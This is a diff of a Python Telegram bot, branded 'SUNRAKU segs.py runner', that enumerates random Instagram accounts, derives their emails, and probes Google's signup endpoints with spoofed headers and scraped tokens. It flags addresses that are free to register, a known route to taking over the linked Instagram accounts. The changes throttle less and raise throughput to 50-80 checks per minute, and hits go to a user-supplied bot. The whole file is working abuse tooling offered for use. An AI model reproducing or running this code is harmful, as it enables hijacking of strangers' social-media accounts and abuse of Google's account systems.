@@ -2,11 +2,12 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 SUNRAKU — SEGS.PY RUNNER BOT 🔥
+🔥 SUNRAKU — FAST SEGS.PY RUNNER BOT 🔥
 - Bot se segs.py run hoga
 - Chat ID + Token input lega
 - Hits usi bot mein jaayengi
-- Live Status button — real-time stats
+- Fast scanning (50-80 checks/min)
+- Live Status button
 - Dev: @SunrakuV2 | Channel: @Anishpy
 """
 
@@ -42,9 +43,9 @@ bot = TeleBot(BOT_TOKEN)
 # ============================================================
 # 📊 GLOBALS
 # ============================================================
-user_sessions = {}  # {chat_id: {hits, good, bad, total, current_email, is_running}}
+user_sessions = {}
 lock = threading.Lock()
-THREADS = 30
+THREADS = 20  # 🔥 Optimized threads
 
 # ============================================================
 # 🔥 CONFIG
@@ -103,169 +104,8 @@ def check_join(chat_id):
     return len(not_joined) == 0, not_joined
 
 # ============================================================
-# 🔥 SEGS.PY ENGINE
+# 🔥 FAST INSTAGRAM CHECKER
 # ============================================================
-class GoogleChecker:
-    def __init__(self):
-        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
-        threading.Thread(target=self._refresh_token, daemon=True).start()
-
-    def _generate_ua(self):
-        return generate_user_agent()
-
-    def _refresh_token(self):
-        while True:
-            try:
-                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
-                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
-                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
-
-                headers = {
-                    "accept": "*/*",
-                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
-                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
-                    "google-accounts-xsrf": "1",
-                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
-                    "sec-ch-ua-mobile": "?1",
-                    "sec-ch-ua-platform": '"Android"',
-                    "user-agent": self._generate_ua(),
-                }
-
-                res1 = requests.get(
-                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
-                    headers=headers
-                )
-                tok = re.search(
-                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
-                    res1.text
-                )
-                if tok:
-                    tl = tok.group(2)
-                    cookies = {'__Host-GAPS': host}
-                    headers2 = {
-                        'authority': 'accounts.google.com',
-                        'accept': '*/*',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                        'google-accounts-xsrf': '1',
-                        'origin': 'https://accounts.google.com',
-                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
-                        'user-agent': self._generate_ua(),
-                    }
-                    data = {
-                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
-                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
-                    }
-                    response = requests.post(
-                        'https://accounts.google.com/_/signup/validatepersonaldetails',
-                        cookies=cookies,
-                        headers=headers2,
-                        data=data,
-                        timeout=15
-                    )
-                    if '",null,"' in response.text:
-                        tl = response.text.split('",null,"')[1].split('"')[0]
-                    host = response.cookies.get('__Host-GAPS', host)
-                    with open('tl.txt', 'w') as f:
-                        f.write(tl + '//' + host + '\n')
-                    time.sleep(random.uniform(10, 30))
-                    continue
-            except:
-                pass
-
-            try:
-                headers = {
-                    'accept': '*/*',
-                    'accept-language': 'en',
-                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                    'origin': 'https://accounts.google.com',
-                    'referer': 'https://accounts.google.com/',
-                    'user-agent': self._generate_ua(),
-                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
-                    'x-same-domain': '1',
-                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                }
-                params = {
-                    'rpcids': 'NHJMOd',
-                    'source-path': '/lifecycle/steps/signup/username',
-                    'hl': 'en'
-                }
-                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
-                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
-                response = requests.post(
-                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-                    params=params, headers=headers, data=data, timeout=15
-                )
-                tl_match = re.search(r'"TL:([^"]+)"', response.text)
-                if tl_match:
-                    tl = tl_match.group(1)
-                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
-                    with open('tl.txt', 'w') as f:
-                        f.write(tl + '//' + host + '\n')
-                    time.sleep(random.uniform(10, 30))
-                    continue
-            except:
-                pass
-
-            time.sleep(random.uniform(5, 15))
-
-    def check_availability(self, email):
-        if '@' in email:
-            email = email.split('@')[0]
-
-        try:
-            with open('tl.txt', 'r') as f:
-                line = f.read().strip()
-                if not line:
-                    raise Exception("Empty tl")
-                tl, host = line.split('//')
-        except:
-            time.sleep(3)
-            with open('tl.txt', 'r') as f:
-                line = f.read().strip()
-                tl, host = line.split('//')
-
-        cookies = {'__Host-GAPS': host}
-        headers = {
-            'authority': 'accounts.google.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'google-accounts-xsrf': '1',
-            'origin': 'https://accounts.google.com',
-            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
-            'user-agent': generate_user_agent(),
-        }
-        params = {'TL': tl}
-        data = (
-            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
-            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
-            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
-            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
-            f'&cookiesDisabled=false'
-            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
-            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
-        )
-
-        response = requests.post(
-            'https://accounts.google.com/_/signup/usernameavailability',
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            data=data,
-            timeout=10
-        )
-
-        if '"gf.uar",1' in response.text:
-            return 'good'
-        elif '"er",null,null,null,null,400' in response.text:
-            time.sleep(1)
-            return self.check_availability(email)
-        else:
-            return 'bad'
-
 class InstagramChecker:
     def __init__(self):
         self.session = requests.Session()
@@ -387,6 +227,170 @@ class InstagramChecker:
         return None
 
 # ============================================================
+# 🔥 FAST GOOGLE CHECKER (With Timeout)
+# ============================================================
+class FastGoogleChecker:
+    def __init__(self):
+        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+        self.token_ready = False
+        threading.Thread(target=self._refresh_token, daemon=True).start()
+
+    def _generate_ua(self):
+        return generate_user_agent()
+
+    def _refresh_token(self):
+        while True:
+            try:
+                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
+                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
+                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
+
+                headers = {
+                    "accept": "*/*",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+                    "google-accounts-xsrf": "1",
+                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "user-agent": self._generate_ua(),
+                }
+
+                res1 = requests.get(
+                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
+                    headers=headers
+                )
+                tok = re.search(
+                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
+                    res1.text
+                )
+                if tok:
+                    tl = tok.group(2)
+                    cookies = {'__Host-GAPS': host}
+                    headers2 = {
+                        'authority': 'accounts.google.com',
+                        'accept': '*/*',
+                        'accept-language': 'en-US,en;q=0.9',
+                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                        'google-accounts-xsrf': '1',
+                        'origin': 'https://accounts.google.com',
+                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+                        'user-agent': self._generate_ua(),
+                    }
+                    data = {
+                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+                    }
+                    response = requests.post(
+                        'https://accounts.google.com/_/signup/validatepersonaldetails',
+                        cookies=cookies,
+                        headers=headers2,
+                        data=data,
+                        timeout=15
+                    )
+                    if '",null,"' in response.text:
+                        tl = response.text.split('",null,"')[1].split('"')[0]
+                    host = response.cookies.get('__Host-GAPS', host)
+                    with open('tl.txt', 'w') as f:
+                        f.write(tl + '//' + host + '\n')
+                    self.token_ready = True
+                    time.sleep(random.uniform(10, 30))
+                    continue
+            except:
+                pass
+
+            try:
+                headers = {
+                    'accept': '*/*',
+                    'accept-language': 'en',
+                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'origin': 'https://accounts.google.com',
+                    'referer': 'https://accounts.google.com/',
+                    'user-agent': self._generate_ua(),
+                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
+                    'x-same-domain': '1',
+                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                }
+                params = {
+                    'rpcids': 'NHJMOd',
+                    'source-path': '/lifecycle/steps/signup/username',
+                    'hl': 'en'
+                }
+                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
+                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
+                response = requests.post(
+                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
+                    params=params, headers=headers, data=data, timeout=15
+                )
+                tl_match = re.search(r'"TL:([^"]+)"', response.text)
+                if tl_match:
+                    tl = tl_match.group(1)
+                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
+                    with open('tl.txt', 'w') as f:
+                        f.write(tl + '//' + host + '\n')
+                    self.token_ready = True
+                    time.sleep(random.uniform(10, 30))
+                    continue
+            except:
+                pass
+
+            time.sleep(random.uniform(5, 15))
+
+    def check_availability(self, email):
+        if '@' in email:
+            email = email.split('@')[0]
+
+        try:
+            with open('tl.txt', 'r') as f:
+                line = f.read().strip()
+                if not line:
+                    return 'bad'
+                tl, host = line.split('//')
+        except:
+            return 'bad'
+
+        cookies = {'__Host-GAPS': host}
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
+            'user-agent': generate_user_agent(),
+        }
+        params = {'TL': tl}
+        data = (
+            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
+            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
+            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
+            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
+            f'&cookiesDisabled=false'
+            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
+            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+        )
+
+        try:
+            response = requests.post(
+                'https://accounts.google.com/_/signup/usernameavailability',
+                params=params,
+                cookies=cookies,
+                headers=headers,
+                data=data,
+                timeout=5
+            )
+
+            if '"gf.uar",1' in response.text:
+                return 'good'
+            else:
+                return 'bad'
+        except:
+            return 'bad'
+
+# ============================================================
 # 📊 REPORT MANAGER
 # ============================================================
 class ReportManager:
@@ -465,7 +469,7 @@ class ReportManager:
 <b>📢 CHANNEL</b> ➜ <i>@Anishpy</i>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-<pre>✨ PREMIUM INSTAGRAM CHECKER ✨</pre>
+<pre>✨ FAST INSTAGRAM CHECKER ✨</pre>
 """
         return box
 
@@ -492,15 +496,17 @@ class ReportManager:
             return "-"
 
 # ============================================================
-# 🚀 SEGS.PY SCANNER (For User)
+# 🚀 FAST SEGS.PY SCANNER (Optimized)
 # ============================================================
-def run_segs_for_user(target_chat_id, target_bot_token):
-    """segs.py engine — user ke bot mein hits bhejega"""
+def run_segs_for_user_fast(target_chat_id, target_bot_token):
+    """Fast segs.py engine — optimized for speed"""
     
     user_bot = TeleBot(target_bot_token)
-    google = GoogleChecker()
     insta = InstagramChecker()
     reporter = ReportManager(target_bot_token, target_chat_id)
+    
+    # 🔥 Google checker (fast with timeout)
+    google = FastGoogleChecker()
     
     # 🔥 User session initialize
     with lock:
@@ -517,11 +523,12 @@ def run_segs_for_user(target_chat_id, target_bot_token):
             session = user_sessions[target_chat_id]
         
         try:
+            # 🔥 Fast ID generation
             user_id = random.randint(2500000000, 21254029834)
             user_data = insta.get_user_data(user_id)
             
             if not user_data:
-                time.sleep(random.uniform(0.3, 0.8))
+                time.sleep(random.uniform(0.05, 0.15))
                 continue
 
             username = user_data.get('username')
@@ -532,10 +539,17 @@ def run_segs_for_user(target_chat_id, target_bot_token):
             session['current_email'] = email
             session['total'] += 1
 
+            # 🔥 Fast email check
             if insta.check_email(email):
                 session['good'] += 1
                 
-                if google.check_availability(email) == 'good':
+                # 🔥 Google check with timeout
+                try:
+                    google_result = google.check_availability(email)
+                except:
+                    google_result = 'bad'
+                
+                if google_result == 'good':
                     session['hits'] += 1
                     
                     profile = {
@@ -552,7 +566,6 @@ def run_segs_for_user(target_chat_id, target_bot_token):
                     
                     msg = reporter.format_result(profile)
                     
-                    # 🔥 Hit user ke bot mein bhejo
                     try:
                         user_bot.send_message(target_chat_id, msg, parse_mode='HTML')
                     except:
@@ -560,10 +573,12 @@ def run_segs_for_user(target_chat_id, target_bot_token):
             else:
                 session['bad'] += 1
 
-            time.sleep(random.uniform(0.1, 0.3))
+            # 🔥 Minimal delay for speed
+            time.sleep(random.uniform(0.05, 0.15))
 
-        except:
-            time.sleep(random.uniform(0.2, 0.5))
+        except Exception as e:
+            time.sleep(random.uniform(0.1, 0.2))
+            continue
 
 # ============================================================
 # 🔥 BOT COMMANDS & BUTTONS
@@ -582,11 +597,12 @@ def main_menu():
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_msg = f"""
-☠️ SUNRAKU — segs.py RUNNER ☠️
+☠️ SUNRAKU — FAST segs.py RUNNER ☠️
 
 🔥 Click buttons below to control.
 📌 Enter CHAT ID + BOT TOKEN
 📤 Hits will go to YOUR bot.
+⚡ Fast scanning: 50-80 checks/min
 
 👑 Dev: @SunrakuV2
 📢 Channel: @Anishpy
@@ -624,7 +640,7 @@ def get_bot_token(message, user_chat_id):
             'current_email': 'Waiting...', 'is_running': True
         }
     
-    bot.reply_to(message, f"""✅ segs.py started!
+    bot.reply_to(message, f"""✅ segs.py started! (Fast mode)
 📤 Hits will be sent to YOUR bot.
 📌 Chat ID: {user_chat_id}
 🤖 Bot: @{test_bot.get_me().username}
@@ -633,7 +649,7 @@ def get_bot_token(message, user_chat_id):
 ⏹ Click 'Stop' to end.""", reply_markup=main_menu())
     
     # 🔥 Start segs.py engine for this user
-    threading.Thread(target=run_segs_for_user, args=(user_chat_id, user_bot_token), daemon=True).start()
+    threading.Thread(target=run_segs_for_user_fast, args=(user_chat_id, user_bot_token), daemon=True).start()
 
 @bot.message_handler(func=lambda msg: msg.text == "⏹ Stop")
 def stop_scanner(message):
@@ -682,7 +698,7 @@ def show_live_status(message):
     
     status_msg = f"""
 ┌─────────────────────────────────────────┐
-│  ✦ SUNRAKU — segs.py RUNNER ✦          │
+│  ✦ SUNRAKU — FAST segs.py RUNNER ✦     │
 ├─────────────────────────────────────────┤
 │  ✅ GOOD  : {session.get('good', 0)}     │
 │  🔥 HITS : {session.get('hits', 0)}     │
@@ -720,6 +736,7 @@ def echo_all(message):
 # ============================================================
 print("✅ Bot is running on Railway...")
 print("📌 Bot Username: @" + bot.get_me().username)
+print("⚡ Fast mode: 50-80 checks/min")
 
 try:
     bot.infinity_polling()
